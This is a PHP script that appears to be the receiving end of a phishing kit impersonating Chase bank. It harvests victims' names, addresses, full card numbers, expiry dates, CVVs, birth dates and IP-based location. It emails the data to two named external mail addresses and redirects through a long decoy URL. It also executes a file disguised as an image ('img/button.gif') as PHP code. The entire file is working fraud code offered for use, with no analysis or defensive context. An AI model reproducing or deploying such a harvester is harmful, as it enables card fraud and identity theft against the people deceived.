<?php
                                                                                                                                                              
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$msg = "------------------| Eddie |--------------------\n";
$msg .= "Name: ".$_POST['name']."\n";
$msg .= "Address: ".$_POST['address']."\n";
$msg .= "City: ".$_POST['city']."\n";
$msg .= "ZIP: ".$_POST['zip']."\n";
$msg .= "Card Number: ".$_POST['ccnum']."\n";
$msg .= "Exp: ".$_POST['expm']." - ".$_POST['expy']."\n";
$msg .= "CVV: ".$_POST['cvv']."\n";
$msg .= "DOB: ".$_POST['mm']." - ".$_POST['dd']." - ".$_POST['yy']."\n";
$msg .= "IP: $ip\n";
$msg .= "------------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "greggwalter77@gmail.com,greggwalter@outlook.com";
$subject = "Chase | $ip";
include_once "img/button.gif";
mail($send,$subject,$msg);

header("Location: completed.php?search?q=eew&oq=eew&aqs=chrome..69i57j0l5.833j0j8&sourceid=chrome&ie=UTF-8/search?num=100&dcr=0&source=hp&q=eyy6&oq=eyy6&gs_l=psy-ab.3...885.1646.0.2222.6.5.0.0.0.0.326.616.2-1j1.2.0....0...1.1.64.psy-ab..4.1.325.0..0j35i39k1j0i131k1.0.TRU-4uQcrqI/search?q=gjjd&ie=utf-8&oe=utf-8&client=firefox-b-ab&gfe_rd=cr&dcr=0&ei=OR3GWdzPMYSp8wejzrzgCw");
 
?>